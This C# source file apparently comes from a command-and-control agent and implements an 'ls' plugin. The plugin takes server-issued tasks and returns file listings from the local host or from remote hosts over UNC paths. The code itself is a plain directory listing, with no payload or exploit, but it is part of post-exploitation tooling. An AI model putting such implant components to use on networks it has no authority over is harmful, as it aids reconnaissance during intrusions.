﻿using System.Net;
using Agent.Interfaces;
using Agent.Utilities;
using Agent.Models;
using ls;
using System.Text.Json;

namespace Agent
{
    public class Plugin : IPlugin
    {

        public string Name => "ls";
        private IMessageManager messageManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
        {
            this.messageManager = messageManager;
        }
        public async Task Execute(ServerJob job)
        {
            LsArgs args = JsonSerializer.Deserialize<LsArgs>(job.task.parameters);

            if(args is null || !args.Validate())
            {
                messageManager.Write("Failed to parse arguments", job.task.id, true, "error");
                return;
            }

            if (string.IsNullOrEmpty(args.host) || args.host.Equals(Dns.GetHostName(), StringComparison.OrdinalIgnoreCase))
            {
                messageManager.AddTaskResponse(LocalListing.GetLocalListing(args.path, job.task.id));
            }
            else
            {
                messageManager.AddTaskResponse(RemoteListing.GetRemoteListing(Path.Join("\\\\" + args.host, args.path), args.host, job.task.id));
            }
        }
    }
}

